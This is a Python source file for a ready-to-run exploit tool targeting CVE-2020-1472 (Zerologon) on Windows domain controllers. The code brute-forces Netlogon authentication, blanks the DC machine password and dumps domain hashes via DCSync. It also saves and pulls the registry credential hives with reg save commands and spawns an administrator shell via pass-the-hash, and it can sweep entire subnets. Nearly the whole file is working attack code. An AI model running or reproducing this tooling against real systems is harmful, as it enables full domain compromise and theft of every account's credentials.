#!/usr/bin/python3

# Standard library imports
import argparse
import binascii
import ipaddress
import logging
import os
import pathlib
import re
import subprocess
import sys


# Third party imports
import impacket
import tqdm
from impacket import smbconnection
from impacket.dcerpc.v5 import epm, nrpc, transport

# Local imports
from zero_effort.tools import restorepassword, secretsdump, wmiexec

# Logging configuration
secretsdump_logger = logging.getLogger(secretsdump.__name__)

# Define custom log levels and their corresponding symbols
LOG_LEVELS = {
    logging.DEBUG: "[*]",
    logging.INFO: "[+]",
    logging.WARNING: "[!]",
    logging.ERROR: "[-]",
    logging.CRITICAL: "[x]",
}

# Define a custom log formatter that includes the log level symbol
class CustomFormatter(logging.Formatter):
    def __init__(self):
        fmt = "[0-effort] %(levelname)s %(message)s"
        super().__init__(fmt)

    def format(self, record):
        record.levelname = LOG_LEVELS.get(record.levelno, record.levelname)
        return super().format(record)


# Get the root logger and set its level
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)

# Create a stream handler and set its level and formatter
handler = logging.StreamHandler()
handler.setLevel(logging.DEBUG)
handler.setFormatter(CustomFormatter())

# Add the handler to the logger
logger.addHandler(handler)

# Current working directory
CURRENT_WD = pathlib.Path().resolve()

# If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000  # False negative chance: 0.04%


def banner() -> str:
    return """
                      000000000                                  
                    00:::::::::00                                    
          __  __   00:::::::::::::00         _   
        /  _|/ _| 0:::::::000:::::::0       | |  
     ___| |_| |_  0::::::0   0::::::0   _ __| |_ 
    / _ \  _|  _| 0:::::0     0:::::0  | '__| __|
   |  __/ | | |   0:::::0 000 0:::::0  | |  | |_ 
    \___|_| |_|   0:::::0     0:::::0  |_|   \__|
           _      0:::::0     0:::::0    
          | |     0::::::0   0::::::0   __ _  ___  _ __ 
          | |     0:::::::000:::::::0  / _` |/ _ \| '_ \ 
          | |      00:::::::::::::00  | (_| | (_) | | | |
          | |____    00:::::::::00     \__, |\___/|_| |_|     
          |______|     000000000       __/ |           
                     CVE-2020-1472    |___/ 
                        @n3rada
"""


class ZeroEffortException(Exception):
    """Exception raised when something wrong happened during the Attack."""

    pass


class Target:

    # Getters / Setters
    @property
    def hashes(self) -> str:
        if self.__hashes == "None:None":
            self.__lmhash, self.__nthash = self.__retrieve_hashes_from_dumped_file()
            self.__hashes = f"{self.__lmhash}:{self.__nthash}"
        return self.__hashes

    # Private instance methods

    def __retrieve_hashes_from_dumped_file(self) -> tuple:

        try:
            file_content = (
                self.__save_folder / pathlib.Path(f"{self.__server_name}$.ntds")
            ).read_text(encoding="utf-8")
        except FileNotFoundError:
            logger.critical("File not found. Run attack before.")
            return

        if not file_content:
            logger.error(f'"{self.__ip}.ntds" file is empty!')
            return
        matching_try = re.search(
            pattern=r"Administrator:(.*?):(.*?):::",
            string=file_content,
            flags=re.IGNORECASE,
        )

        if not matching_try:
            matching_try = re.search(
                pattern=f"{self.__domain_name}\\\\" + r"Administrator:(.*?):(.*?):::",
                string=file_content,
                flags=re.IGNORECASE,
            )

        if matching_try is None:
            logger.error("There is a problem matching the lmhash:nthash")
            return

        hashes = matching_try.group(2)
        logger.info(f"Administrator hashes: {hashes}")
        return hashes.split(":")

    def __start_rpc_con(
        self, dest_host: str, remote_if: bytes = None, protocol: str = None
    ):
        try:
            rpc_con = transport.DCERPCTransportFactory(
                stringbinding=epm.hept_map(
                    destHost=dest_host,
                    remoteIf=remote_if or nrpc.MSRPC_UUID_NRPC,
                    protocol=protocol or "ncacn_ip_tcp",
                )
            ).get_dce_rpc()
            rpc_con.connect()
            rpc_con.bind(iface_uuid=nrpc.MSRPC_UUID_NRPC)
        except impacket.dcerpc.v5.rpcrt.DCERPCException as exc:
            logger.critical("Error during RPC binding!")
            raise ZeroEffortException(exc)
        else:
            logger.info(f"Remote Procedure Call connector binded to {self.__ip}")

            return rpc_con

    def __get_smb_connection_object(self) -> smbconnection.SMBConnection:
        """Establish a SMB connection to the target machine."""
        if self.__ip is None:
            return

        for port in [445, 139, 135]:
            try:
                logger.debug(
                    f"Trying to establish an SMB connection to {self.__ip}:{port}"
                )
                smb_con = smbconnection.SMBConnection(
                    remoteName=self.__ip,
                    remoteHost=self.__ip,
                    sess_port=port,
                    timeout=2,
                )
                smb_con.login(user="", password="", ntlmFallback=True)
            except OSError:
                logger.critical("Connection refused")
                continue
            except (impacket.nmb.NetBIOSTimeout, impacket.nmb.NetBIOSError):
                logger.error("Impossible to connect")
                continue
            except impacket.smbconnection.SessionError as exc:
                logger.critical(f"Anonymous login is not possible!")
                break
            except Exception as exc:
                logger.error(f"Exception '{type(exc)}' occured: {exc}")
                break
            else:
                try:
                    smb_con.logoff()
                except Exception:
                    # Don't care, you just want the smb_con instance
                    pass
                else:
                    self.__smb_port = port
                    return smb_con

    def __remote_dumping(self) -> None:
        """Dumping with control."""
        logger.debug(f"Trying to dump for time number {self.__dumping_counter}")
        if self.__dumping_counter == 5:
            logger.error("Ok. White flag for me")
            return
        try:
            self.dumper.dump()
        except impacket.dcerpc.v5.scmr.DCERPCSessionError:
            logger.warning("Error during cleaning up. Not my fault!")
            return
        except Exception as exc:
            self.__dumping_counter += 1
            logger.warning(f"Exception {type(exc)} occured: {exc}")
            logger.debug("Exploiting again.")
            self.zerologon()
            self.__remote_dumping()
        else:
            logger.info("Dumped")

    def __extract_plaintext_password(self, file_name: str) -> str:
        return binascii.unhexlify(
            re.search(
                pattern=r".+:plain_password_hex:(.+)",
                string=(self.__save_folder / pathlib.Path(file_name)).read_text(
                    encoding="utf-8"
                ),
            ).group(1)
        )

    def __restoring_password(self, file_name: str) -> None:
        plaintext_password = self.__extract_plaintext_password(file_name=file_name)
        logger.info(
            f'Plaintext password for {file_name}: "{plaintext_password.decode(encoding="utf-16le")}"'
        )
        action = restorepassword.ChangeMachinePassword(
            username=self.__server_name,
            password=plaintext_password,
            port=self.__smb_port,
            hashes=None,
            domain_sids=False,
        )
        action.dump(self.__server_name, self.__ip)

    # Constructor
    def __init__(self, target_ip: str, share_folder: str = None):
        self.__ip = target_ip
        logger.debug(f"DC ip address: {self.__ip}")

        self.__share_folder = share_folder or "ADMIN$"

        self.__smb_port = None
        smb_con = self.__get_smb_connection_object()
        if smb_con is None:
            logger.critical("SMB connection does not worked")
            raise ZeroEffortException

        logger.info(f"SMB port is: {self.__smb_port}")

        self.__server_name = smb_con.getServerName()
        logger.debug(f"DC name: {self.__server_name}")
        self.__domain_name = smb_con.getServerDNSDomainName()
        logger.debug(f"DNSDomainName: {self.__domain_name}")

        self.__dc_handle = f"\\\\{self.__server_name}"

        self.__save_folder = CURRENT_WD / pathlib.Path(
            f"loots/{self.__domain_name}/{self.__server_name}"
        )
        self.__save_folder.mkdir(parents=True, exist_ok=True)

        self.__rpc_con = self.__start_rpc_con(dest_host=self.__ip)

        self.secretsdump_options = secretsdump.DumpSecretsOptions(
            target_ip=self.__ip,
        )

        self.__lmhash = None
        self.__nthash = None
        self.__hashes = f"{self.__lmhash}:{self.__nthash}"

        self.dumper = None

        self.__dumping_counter = 1

    # Public methods
    def zero_authentication_workflow(self):
        ciphertext = b"\x00" * 8

        # Send challenge and authentication request.
        nrpc.hNetrServerReqChallenge(
            dce=self.__rpc_con,
            primaryName=self.__dc_handle + "\x00",
            computerName=self.__server_name + "\x00",
            clientChallenge=b"\x00" * 8,
        )

        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                dce=self.__rpc_con,
                primaryName=self.__dc_handle + "\x00",
                accountName=self.__server_name + "$\x00",
                secureChannelType=nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                computerName=self.__server_name + "\x00",
                clientCredential=ciphertext,
                # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
                negotiateFlags=0x212FFFFF,
            )

            # It worked!
            assert server_auth["ErrorCode"] == 0
            return self.__rpc_con

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error.
            # Otherwise, the attack_workflow is probably not working.
            if ex.get_error_code() != 0xC0000022:
                logger.error(f"Unexpected error code from DC: {ex.get_error_code()}")
                return None

    def set_empty_password(self):

        logger.debug("Using NetrServerPasswordSet2 to set an empty password on the DC")
        request = nrpc.NetrServerPasswordSet2()
        request["PrimaryName"] = self.__dc_handle + "\x00"
        request["AccountName"] = self.__server_name + "$\x00"
        request[
            "SecureChannelType"
        ] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = b"\x00" * 8
        authenticator["Timestamp"] = 0
        request["Authenticator"] = authenticator
        request["ComputerName"] = self.__server_name + "\x00"
        request["ClearNewPassword"] = b"\x00" * 516

        return self.__rpc_con.request(request)

    def brute_forcing_server(self, attempts: int = None) -> bool:
        if attempts is None:
            attempts = MAX_ATTEMPTS
        for _ in tqdm.tqdm(
            iterable=range(attempts),
            desc="[0-effort] [*] Brute-forcing NetrServerAuthenticate3",
            unit="auth",
            initial=1,
            total=attempts,
            ascii=True,
            bar_format="{desc}: {n_fmt} requests",
        ):
            if self.zero_authentication_workflow():
                return True

        logger.error("Attack failed. Target is probably patched.")
        return False

    def zerologon(self) -> bool:
        logger.info("-" * 55)
        logger.info("Starting the ZeroLogon workflow")

        if self.brute_forcing_server() is False:
            return False

        result = None
        for _ in range(MAX_ATTEMPTS):
            try:
                result = self.set_empty_password()
            except nrpc.DCERPCSessionError as ex:
                # Failure should be due to a STATUS_ACCESS_DENIED error.
                # Otherwise, the attack_workflow is probably not working.
                error_code = ex.get_error_code()
                if error_code != 0xC0000022:
                    logger.error(f"Unexpected error code from DC: {error_code}.")
                    return False
            except BaseException as ex:
                logger.error(f"Something went wrong: {ex.with_traceback()}")
                return False
            else:
                if result is not None:
                    break

        if error_code := result["ErrorCode"]:
            logger.error(f"ErrorCode is {error_code}. Something went wrong?")
            return False

        logger.info("Password successfully set to empty string!")
        logger.info("-" * 55)

        return True

    def retrieve_registry_hives(self) -> None:
        logger.info("Retrieving the hives (i.e., SAM, SECURITY, SAVE)")

        for command in [
            "reg save HKLM\SYSTEM system.save /y",
            "reg save HKLM\SAM sam.save /y",
            "reg save HKLM\SECURITY security.save /y",
            "lget system.save",
            "lget sam.save",
            "lget security.save",
            "del /f system.save",
            "del /f sam.save",
            "del /f security.save",
        ]:
            logger.debug(f"Executing: {command}")
            wmiexec_instance = wmiexec.WMIEXEC(
                command=command,
                username="administrator",
                password="",
                domain=self.__domain_name,
                hashes=self.hashes,
                aesKey=None,
                share=self.__share_folder,
                noOutput=False,
                doKerberos=False,
                kdcHost=None,
                shell_type="cmd",
            )
            wmiexec_instance.run(self.__ip, False)

        logger.info("Hives retrieved")
        self.secretsdump_options.reset()
        self.secretsdump_options.outputfile = (
            f"{self.__save_folder}/{self.__server_name}$"
        )
        self.secretsdump_options.security = "security.save"
        self.secretsdump_options.system = "system.save"
        self.secretsdump_options.sam = "sam.save"

        secretsdump.DumpSecrets(
            remoteName="LOCAL",
            username="",
            password="",
            domain="",
            options=self.secretsdump_options,
        ).dump()

        logger.info("Hives dumped")

        # Cleaning
        for file_path in CURRENT_WD.iterdir():
            if file_path.suffix == ".save":
                file_path.unlink()

    def spawn_shell(
        self,
        share_folder: str = "ADMIN$",
        shell_type: str = "powershell",
    ) -> None:
        logger.debug(f"Passing-The-Hash to spawn a {shell_type} shell as Administrator")

        try:
            logger.info(f'Using "LMHASH:NTHASH"="{self.hashes}"')
        except TypeError:
            return
        logger.debug(f'Testing if "Evil-WinRM" is available ...')

        try:
            # Run the "evil-winrm" command and capture the output
            subprocess.check_output(["evil-winrm", "-h"])
            # If the command runs without error, "evil-winrm" is available
            logger.info("Evil-WinRM is available, using-it")
            logger.debug(
                f'evil-winrm -i {self.__ip} -u "administrator" -H {self.__nthash}'
            )
            subprocess.run(
                [
                    "/usr/bin/evil-winrm",
                    "-i",
                    self.__ip,
                    "-u",
                    "administrator",
                    "-H",
                    self.__nthash,
                ]
            )
        except subprocess.CalledProcessError:
            # If the "evil-winrm" command fails, it means it's not available
            logger.error("Evil-winrm is not available")

            wmiexec_instance = wmiexec.WMIEXEC(
                command=" ",
                username="administrator",
                password="",
                domain=self.__domain_name,
                hashes=self.hashes,
                aesKey=None,
                share=share_folder,
                noOutput=False,
                doKerberos=False,
                kdcHost=None,
                shell_type=shell_type,
            )
            logger.debug("Windows Management Instrumentation (WMI) is ready")
            wmiexec_instance.run(self.__ip, silentCommand=False)
        except Exception as exc:
            logger.error(f"Exception occured: {exc.with_traceback()}")
        finally:
            return

    def secrets_dumping(self) -> None:
        """Dumping all secrets needed"""

        username = f"{self.__server_name}$"
        password = ""
        hostname = self.__ip

        target_printable = f"{self.__domain_name}/{username}:{password}@{hostname}"

        logger.info(f"DCsync attack on {target_printable}")

        self.dumper = secretsdump.DumpSecrets(
            remoteName=hostname,
            username=username,
            password="",
            domain=self.__domain_name,
            options=self.secretsdump_options,
        )
        logger.info("Dumping just the DC without password")
        logger.debug(f"secretdumps.py -no-pass -just-dc '{target_printable}'")
        self.secretsdump_options.just_dc = True
        self.secretsdump_options.user_status = True
        self.secretsdump_options.outputfile = (
            f"{self.__save_folder}/{self.dumper.username}"
        )

        self.__remote_dumping()

        logger.info("Find the old NT hash of the DC")
        self.secretsdump_options.reset(keep_ip=True)
        self.secretsdump_options.history = True
        self.secretsdump_options.just_dc = True
        self.secretsdump_options.just_dc_user = f"{self.__server_name}$"
        self.secretsdump_options.hashes = ":31d6cfe0d16ae931b73c59d7e0c089c0"
        self.secretsdump_options.outputfile = (
            f"{self.__save_folder}/{self.dumper.username}-history"
        )

        logger.debug(
            f"secretdumps.py -history -just-dc-user '{self.__server_name}$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '{target_printable}'"
        )

        self.__remote_dumping()

        logger.info("Pass-The-Hash: dumping of SAM & LSA secrets for Administrator")
        self.dumper.username = "Administrator"
        self.secretsdump_options.reset(keep_ip=True)
        self.secretsdump_options.hashes = self.hashes
        self.secretsdump_options.outputfile = f"{self.__save_folder}/Administrator"

        logger.debug(
            f"secretdumps.py -hashes '{self.__lmhash}:{self.__nthash}' {self.__domain_name}/{self.dumper.username}:{self.dumper.password}@{hostname}"
        )

        self.__remote_dumping()

    def attack_workflow(self: str):
        # Firstly
        if not self.zerologon():
            sys.exit(1)

        self.secrets_dumping()
        try:
            self.__restoring_password(file_name="Administrator.secrets")
        except impacket.dcerpc.v5.nrpc.DCERPCSessionError:
            logger.error("Impossible to restore password")
        self.retrieve_registry_hives()
        try:
            self.__restoring_password(file_name=f"{self.__server_name}$.secrets")
        except impacket.dcerpc.v5.nrpc.DCERPCSessionError:
            logger.error("Impossible to restore password")


def cli() -> None:
    # Clearing the Screen
    os.system("/usr/bin/clear")
    print(banner())

    # Arguments
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Exploiting CVE-2020-1472 (a.k.a Zerologon) without effort.",
    )

    parser.add_argument(
        "target_ip", action="store", help="IP of the Domain Controller to use"
    )

    parser.add_argument(
        "-a",
        "--attack",
        action="store_true",
        help="Only run the attack, no shell.",
    )

    parser.add_argument(
        "-d",
        "--debug",
        action="store_true",
        help="Set logging level to DEBUG.",
    )

    parser.add_argument(
        "-s",
        "--shell",
        action="store_true",
        help="If you want to only drop a shell (Assuming credentials are already looted).",
    )
    parser.add_argument(
        "-share",
        action="store",
        default="ADMIN$",
        help="Grab the output from Share folder (default ADMIN$).",
    )

    options = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if options.debug:
        logger.setLevel(logging.DEBUG)
        secretsdump_logger.setLevel(level=logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)
        secretsdump_logger.setLevel(logging.INFO)

    subnet = ipaddress.ip_network(options.target_ip)

    for ip in subnet:
        logger.info("#" * 35 + f" {ip}")
        try:
            target_instance = Target(target_ip=str(ip), share_folder=options.share)

            if not options.shell:
                target_instance.attack_workflow()
            if not options.attack:
                target_instance.spawn_shell(share_folder=options.share)
        except ZeroEffortException:
            logger.critical(f"{ip} is neither vulnerable nor reachable")
            continue
        except KeyboardInterrupt:
            print("\n")
            logger.warning("How dare you interrupt my work?")
            break

    logger.info("Finished")
    sys.exit(0)
